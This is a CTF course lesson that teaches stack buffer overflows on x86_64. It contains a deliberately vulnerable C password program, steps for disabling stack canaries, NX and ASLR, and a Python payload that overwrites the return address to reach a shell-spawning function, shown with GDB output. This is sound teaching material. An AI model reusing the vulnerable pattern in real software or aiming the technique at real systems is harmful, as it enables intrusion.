<h1 align="center">PWN 200</h1>
  <p align="center">
  Basic Buffer Overflow
  </p>

### Table of contents

- [Introduction](#introduction)
- [Stack Frames](#stack-frames)
- [Crashing the Program](#crashing-the-program)
- [Controlling the Return Address](#controlling-the-return-address)
- [Returning to Another Function](#returning-to-another-function)
- [Practice](#practice)
- [More Resources](#more-resources)
- [Creators](#creators)

## Introduction

The stack buffer overflow is probably the most common vulnerability seen in CTF challenges for the binary exploitation category. Buffer overflows occur whenever an attacker tries to store too much data in a buffer, which can allow the attacker to manipulate whatever data comes right after the buffer. This vulnerability can be quite serious, and many times it can allow the attacker to obtain complete control over the program.

## Stack Frames

<p align="center"><img src="https://github.com/MasonCompetitiveCyber/ctf-courses/raw/main/images/pwn/stack_frames.png" width=35%  height=35%><br>Image source: https://en.citizendium.org/wiki/Stack_frame</p>

Before we get into how you can actually conduct a buffer overflow attack, we need to discuss how the stack works. Whenever a function is called in assembly, a new stack frame will be created. Since the stack grows down, the stack frame is always created by subtracting a value from `rsp`, and it is always destroyed by adding a value to `rsp`. Whenever a function is called by the program, the following will occur:
1. If the caller needs to, the caller can save the contents of the caller-saved registers by pushing them onto the stack. According to the [x86_64 Calling Convention](https://aaronbloomfield.github.io/pdr/book/x86-64bit-ccc-chapter.pdf), the caller-saved registers are `r10`, `r11`, plus any registers that contain parameters.
2. The caller can pass six arguments to the callee by storing the arguments in the following registers: `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`. If more than six arguments are required by the function, then they are pushed onto the stack in reverse order.
3. The `call` instruction is executed. Before `rip` is set equal to the address of the function, the value of `rip` is pushed onto the stack. This is known as the "return address."
4. The callee pushes the value of `rdp` onto the stack.
5. The callee sets `rdp` equal to `rsp`.
6. If the callee needs to store local variables on the stack, it will subtract `rsp` by the total number of bytes that it needs.

Steps 1-3 are always done by the caller. Steps 4-6 are known as the "function prologue" because they occur at the beginning of every function. While inside the body of the function, function parameters and local variables can be accessed by adding or subtracting a value to `rdp` and dereferencing the result. When the function exits, the following will occur:

1. The callee adds to `rsp` the same value that it subtracted earlier, which destroys the function's local variables.
2. The callee pops `rdp` off from the stack, which sets its value back to the previous stack frame pointer.
3. The callee executes the `ret` instruction, which will execute a `pop rip` instruction. This returns control over to the caller.
4. The caller removes the parameters from the stack (if there were more than six parameters).
5. The caller pops off the contents of any caller-saved registers stored on the stack.

Steps 1-3 are known as the "function epilogue" because they occur at the end of every function.

## Crashing the Program

Suppose we had a function that contained an array of 16 characters. Let's also suppose that this array was allocated using a local buffer on the stack. If we were able to copy more than 16 characters onto this buffer, then there would be a chance that we could modify other values on the stack frame. This could potentially lead into some weird situations that cause the program to segfault. Let's look at one such example.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void correct() {
    printf("You entered in the correct password!\n");
    system("/bin/sh");
}

int main(int argv, char **argc) {
    char pass[16];

    printf("Enter the password: ");
    fgets(pass, 1000, stdin);
    
    if(strncmp(pass, "bufferoverflows\n", 16) == 0) {
        correct();
    } else {
        printf("Invalid password.\n");
    }

    return 0;
}
```

In the following C program, we are reading in a string from STDIN and storing it inside of a 16-byte-long character array called `pass`. We then use the `strncmp()` function from `string.h` to check whether `pass` is equal to `bufferoverflows`. If the password is correct, then we call the function `correct()`, which gives us a shell. Else, we are given a message that indicates that an invalid password was inputted.

```sh
$ gcc -o password -fno-stack-protector -z execstack password.c

$ ./password
Enter the password: incorrect
Invalid password.

$ ./password
Enter the password: bufferoverflows
You entered in the correct password!
$ ls
password  password.c  README.md  test
$ whoami
nihaal
$
```

Note that the `-fno-stack-protector` and the `-z execstack` options were used when compiling the program with `gcc`. These two options will disable [stack canaries](https://ctf101.org/binary-exploitation/stack-canaries/) and the [NX bit](https://en.wikipedia.org/wiki/NX_bit), which are two common mitigations against buffer overflows. We'll go over how you can get around these two mitigations in a later course, but for now, we'll use these options to make the buffer overflow easier to learn.

We also need to disable [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization), which is another exploit mitigation technology that we'll discuss in a later course. This can be disabled by running the following command on your computer: `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`. You'll have to disable ASLR every time you restart your computer, and until we discuss how you can bypass ASLR, you'll want to have ASLR disabled for the next few courses as well.

When we look at the code for the program, one thing that should stick out to you if you're a good C programmer is the fact that the call to `fgets()` has a size of 1000 instead of 16. This means that we can type in more than 16 bytes into the program, and it will still get stored in the buffer even though the size of the buffer is supposed to be limited to only 16 bytes. What would happen if typed in 100 characters instead of 16? We can use python's `sys.stdout.buffer.write()` function to print out exactly 100 characters so that we don't have to type out all 100 by hand.

```sh
$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*100)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*100)" > test

$ ./password < test
Enter the password: Invalid password.
zsh: segmentation fault  ./password < test
```

Interesting. We get a segmentation fault when we try to type in 100 characters into the 16-byte buffer. Why is this happening? Well, let's look at the program through [GDB](https://sourceware.org/gdb/current/onlinedocs/gdb/) and see what exactly is going on. We can use the `run` or `r` command from within GDB to start running the program, and we can also use the input redirector (<) inside GDB to indicate that we want our input to come from the "test" file that we just made.

```sh
$ gdb password                                                                                           139 ⨯
GNU gdb (Debian 10.1-1.4) 10.1
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
76 commands loaded for GDB 10.1 using Python engine 3.9
[*] 4 commands could not be loaded, run `gef missing` to know why.
Reading symbols from password...
(No debugging symbols found in password)
gef➤  run < test
Starting program: /home/nihaal/Desktop/ctf-courses/Pwn/PWN 200/password < test
Enter the password: Invalid password.

Program received signal SIGSEGV, Segmentation fault.
0x0000555555555206 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0
$rbx   : 0x0
$rcx   : 0x00007ffff7edded3  →  0x5577fffff0003d48 ("H="?)
$rdx   : 0x0
$rsp   : 0x00007fffffffdfb8  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00005555555592a0  →  "Enter the password: Invalid password.\n"
$rdi   : 0x00007ffff7fb0670  →  0x0000000000000000
$rip   : 0x0000555555555206  →  <main+114> ret
$r8    : 0x12
$r9    : 0x00007ffff7fadbe0  →  0x000055555555a6b0  →  0x0000000000000000
$r10   : 0x00007ffff7feeb70  →  <strcmp+2864> pxor xmm0, xmm0
$r11   : 0x246
$r12   : 0x0000555555555090  →  <_start+0> xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdfb8│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"    ← $rsp
0x00007fffffffdfc0│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffdfc8│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffdfd0│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x00007fffffffdfd8│+0x0020: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0x00007fffffffdfe0│+0x0028: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0x00007fffffffdfe8│+0x0030: "AAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0x00007fffffffdff0│+0x0038: "AAAAAAAAAAAAAAAAAAAA"
──────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555551fb <main+103>       call   0x555555555040 <puts@plt>
   0x555555555200 <main+108>       mov    eax, 0x0
   0x555555555205 <main+113>       leave
 → 0x555555555206 <main+114>       ret
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "password", stopped 0x555555555206 in main (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555206 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

Note: The above instance of GDB is running the [GDB Enhanced Features (GEF)](https://gef.readthedocs.io/en/master/) plugin, which adds features that assist exploit developers.

Let's take a look at what is going on here. The program sent a `SIGSEGV` signal after it failed to execute the `ret` instruction at line `main+114`. Recall that the `ret` instruction works by trying to execute a `pop rip` instruction. If `rsp` is currently pointing to a bunch of A's instead of the return address, then when the `ret` instruction is executed, the program will attempt to store `0x4141414141414141` (the ASCII code for eight A's) into `rip`. Since the program realizes that `0x4141414141414141` is not an executable address, it fails to load the value into `rip` and instead sends a `SIGSEGV` signal.

In other words, when we overflowed the `pass` buffer with 100 A's, we ended up modifying other values on the stack as well. The buffer overflow allowed us to change the value of the return address with A's, and when the `ret` instruction was executed, the program attempted to set `rip` to the invalid address `0x4141414141414141`, causing a segfault. 

## Controlling the Return Address

Now we know that we can modify the return address to be a bunch of A's. Can we use this idea to set the return address to be any arbitrary value? Yes we can! We simply have to figure out the minimum number of A's that we need to send to the program in order to get it to crash. Then, we can type in the arbitrary value that we want to set the return address to right after the A's.

```sh
$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*50)" > test

$ ./password < test
Enter the password: Invalid password.
zsh: segmentation fault  ./password < test

$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*25)" > test

$ ./password < test
Enter the password: Invalid password.
zsh: segmentation fault  ./password < test

$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*20)" > test

$ ./password < test
Enter the password: Invalid password.

$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*21)" > test

$ ./password < test
Enter the password: Invalid password.

$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*22)" > test

$ ./password < test
Enter the password: Invalid password.

$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*23)" > test

$ ./password < test
Enter the password: Invalid password.

$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*24)" > test

$ ./password < test
Enter the password: Invalid password.
zsh: segmentation fault  ./password < test
```

This takes some trial and error, but after some time, we can figure out that the program does not crash after 23 A's, but it does crash after 24 A's. This tells us that the return address appears 24 bytes after the start of the buffer, and we need to type at least 24 bytes before we can set the return address. If, for example, we type out a bunch of B's after 24 A's, then the return address will be set equal to 0x4242424242424242 (ASCII code for eight B's).

```sh
$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*24 + b'BBBBBBBB')" > test

$ gdb password
GNU gdb (Debian 10.1-1.4) 10.1
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
76 commands loaded for GDB 10.1 using Python engine 3.9
[*] 4 commands could not be loaded, run `gef missing` to know why.
Reading symbols from password...
(No debugging symbols found in password)
gef➤  run < test
Starting program: /home/nihaal/Desktop/ctf-courses/Pwn/PWN 200/password < test
Enter the password: Invalid password.

Program received signal SIGSEGV, Segmentation fault.
0x0000555555555206 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0
$rbx   : 0x0
$rcx   : 0x00007ffff7edded3  →  0x5577fffff0003d48 ("H="?)
$rdx   : 0x0
$rsp   : 0x00007fffffffdfb8  →  "BBBBBBBB"
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00005555555592a0  →  "Enter the password: Invalid password.\n"
$rdi   : 0x00007ffff7fb0670  →  0x0000000000000000
$rip   : 0x0000555555555206  →  <main+114> ret
$r8    : 0x12
$r9    : 0x00007ffff7fadbe0  →  0x000055555555a6b0  →  0x0000000000000000
$r10   : 0x00007ffff7feeb70  →  <strcmp+2864> pxor xmm0, xmm0
$r11   : 0x246
$r12   : 0x0000555555555090  →  <_start+0> xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdfb8│+0x0000: "BBBBBBBB"   ← $rsp
0x00007fffffffdfc0│+0x0008: 0x00007fffffffe000  →  0x0000000000000000
0x00007fffffffdfc8│+0x0010: 0x0000000100000000
0x00007fffffffdfd0│+0x0018: 0x0000555555555194  →  <main+0> push rbp
0x00007fffffffdfd8│+0x0020: 0x00007ffff7e157cf  →  <init_cacheinfo+287> mov rbp, rax
0x00007fffffffdfe0│+0x0028: 0x0000000000000000
0x00007fffffffdfe8│+0x0030: 0x546dfa454d39a707
0x00007fffffffdff0│+0x0038: 0x0000555555555090  →  <_start+0> xor ebp, ebp
──────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555551fb <main+103>       call   0x555555555040 <puts@plt>
   0x555555555200 <main+108>       mov    eax, 0x0
   0x555555555205 <main+113>       leave
 → 0x555555555206 <main+114>       ret
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "password", stopped 0x555555555206 in main (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555206 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

Now we know that we can set the return address to whatever value we want by simply replacing the B's with the value that we want to set the return address to. We have obtained complete control over the return address.

Here, we used a brute-force approach in order to figure out that we need exactly 24 bytes of data before we can type in the return address. There is a much faster method that we can use to figure out the number of bytes that we need, which we'll go over in the next course.

## Returning to Another Function

We can look at the source code and easily see what the correct password is, but what if we were in a situation where we had no idea what the correct password was? In the real world, most passwords are [hashed](https://www.wired.com/2016/06/hacker-lexicon-password-hashing/) with an unbreakable cryptographic hashing algorithm when they are stored. If we were in such a scenario where we did not know the correct password, how could we call the `correct()` function?

Well, let's look at the facts. We know that we can change the return address to any value that we want by sending 24 bytes of useless data followed by the value we want to set the return address to. What would happen if we were to set the return address equal to the address of `correct()`? Let's find out.

We first need to figure out what the address of `correct()` actually is. This is pretty easy to do while ASLR is disabled; all we have to do is use the `disas correct` command in GDB. It is more complicated to do this step when ASLR is enabled because ASLR changes the addresses every time you run the program, so we will discuss how to deal with ASLR in a later course.

```sh
gef➤  disas correct
Dump of assembler code for function correct:
   0x0000555555555175 <+0>:     push   rbp
   0x0000555555555176 <+1>:     mov    rbp,rsp
   0x0000555555555179 <+4>:     lea    rdi,[rip+0xe88]        # 0x555555556008
   0x0000555555555180 <+11>:    call   0x555555555040 <puts@plt>
   0x0000555555555185 <+16>:    lea    rdi,[rip+0xea1]        # 0x55555555602d
   0x000055555555518c <+23>:    call   0x555555555050 <system@plt>
   0x0000555555555191 <+28>:    nop
   0x0000555555555192 <+29>:    pop    rbp
   0x0000555555555193 <+30>:    ret
End of assembler dump.
```

As we can see in the assembler dump above, `0x0000555555555175` is the address of the first line of code in `correct()`, so all we need to do now is change the return address to `0x0000555555555175`. This can be done with the following python code:

```sh
$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*24 + b'\x75\x51\x55\x55\x55\x55')" > test
```

Note that we must convert the big-endian value `0x0000555555555175` into its little-endian equivalent when we use this command. When we run the program inside GDB using the test file as input, we can actually see that we're jumping into the `correct()` function when the `ret` instruction is executed. We can use the `break` or `b` command to setup a breakpoint, which will allow us to pause the program and see what's going on.

```sh
$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*24 + b'\x75\x51\x55\x55\x55\x55')" > test

$ gdb password
GNU gdb (Debian 10.1-1.4) 10.1
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
76 commands loaded for GDB 10.1 using Python engine 3.9
[*] 4 commands could not be loaded, run `gef missing` to know why.
Reading symbols from password...
(No debugging symbols found in password)
gef➤  b *main+114
Breakpoint 1 at 0x1206
gef➤  run < test
Starting program: /home/nihaal/Desktop/ctf-courses/Pwn/PWN 200/password < test
Enter the password: Invalid password.

Breakpoint 1, 0x0000555555555206 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0
$rbx   : 0x0
$rcx   : 0x00007ffff7edded3  →  0x5577fffff0003d48 ("H="?)
$rdx   : 0x0
$rsp   : 0x00007fffffffdfb8  →  0x0000555555555175  →  <correct+0> push rbp
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00005555555592a0  →  "Enter the password: Invalid password.\n"
$rdi   : 0x00007ffff7fb0670  →  0x0000000000000000
$rip   : 0x0000555555555206  →  <main+114> ret
$r8    : 0x12
$r9    : 0x00007ffff7fadbe0  →  0x000055555555a6b0  →  0x0000000000000000
$r10   : 0x00007ffff7feeb70  →  <strcmp+2864> pxor xmm0, xmm0
$r11   : 0x246
$r12   : 0x0000555555555090  →  <_start+0> xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdfb8│+0x0000: 0x0000555555555175  →  <correct+0> push rbp  ← $rsp
0x00007fffffffdfc0│+0x0008: 0x00007fffffffe0a8  →  0x00007fffffffe3b4  →  "/home/nihaal/Desktop/ctf-courses/Pwn/PWN 200/passw[...]"
0x00007fffffffdfc8│+0x0010: 0x0000000100000000
0x00007fffffffdfd0│+0x0018: 0x0000555555555194  →  <main+0> push rbp
0x00007fffffffdfd8│+0x0020: 0x00007ffff7e157cf  →  <init_cacheinfo+287> mov rbp, rax
0x00007fffffffdfe0│+0x0028: 0x0000000000000000
0x00007fffffffdfe8│+0x0030: 0x3ffcb50f7bb44b62
0x00007fffffffdff0│+0x0038: 0x0000555555555090  →  <_start+0> xor ebp, ebp
──────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555551fb <main+103>       call   0x555555555040 <puts@plt>
   0x555555555200 <main+108>       mov    eax, 0x0
   0x555555555205 <main+113>       leave
 → 0x555555555206 <main+114>       ret
   ↳  0x555555555175 <correct+0>      push   rbp
      0x555555555176 <correct+1>      mov    rbp, rsp
      0x555555555179 <correct+4>      lea    rdi, [rip+0xe88]        # 0x555555556008
      0x555555555180 <correct+11>     call   0x555555555040 <puts@plt>
      0x555555555185 <correct+16>     lea    rdi, [rip+0xea1]        # 0x55555555602d
      0x55555555518c <correct+23>     call   0x555555555050 <system@plt>
──────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "password", stopped 0x555555555206 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555206 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

If we continue execution with the `continue` or `c` command, we'll actually see a message getting printed out indicating that we typed in the correct password. Note that the `set follow-fork-mode child` command was used here to make sure that we debugged the child process when the call to `system("/bin/sh")` occurs in `correct()`.

```sh
gef➤  set follow-fork-mode child
gef➤  continue
Continuing.
You entered in the correct password!
[Attaching after process 3124 vfork to child process 3132]
[New inferior 2 (process 3132)]
[Detaching vfork parent process 3124 after child exec]
[Inferior 1 (process 3124) detached]
process 3132 is executing new program: /usr/bin/dash
```

Congratulations! You have successfully conducted a buffer overflow that allowed you to bypass the login system for this binary!

## Practice:
- TODO: Get a TCTF challenge here.

## More Resources:
- [Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html)
- [Stack Frame](https://en.citizendium.org/wiki/Stack_frame)
- [x86_64 Calling Convention](https://aaronbloomfield.github.io/pdr/book/x86-64bit-ccc-chapter.pdf)
- [GDB User Manual](https://sourceware.org/gdb/current/onlinedocs/gdb/)
- [GEF Documentation](https://gef.readthedocs.io/en/master/)

## Creators

**Nihaal Prasad**

Enjoy :metal:
